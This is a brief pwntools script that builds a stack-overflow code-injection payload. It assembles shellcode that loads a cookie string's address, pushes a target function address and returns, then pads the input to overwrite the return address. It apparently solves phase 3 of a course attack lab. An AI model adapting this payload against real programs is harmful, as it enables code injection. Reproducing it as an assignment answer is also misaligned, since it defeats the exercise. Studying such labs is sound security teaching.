from pwn import *
context(arch='amd64', os='linux')

r = b''
# r += asm('mov rdi, 0x6044dc')
# r += asm('mov DWORD PTR [rdi], 0x3')
r += asm('mov rdi, 0x55614130')
r += asm('sub rsp, 0x200')
r += asm('push 0x4021f3')
# r += asm('push 0x40191a')
r += asm('ret')
r += b'z' * (8 - len(r) % 8)
r += b'5ff762f9\0'
r += b'a' * (0x28 - len(r)) + p32(0x55614118)

with open('pc3.bin', 'wb') as f:
  f.write(r)
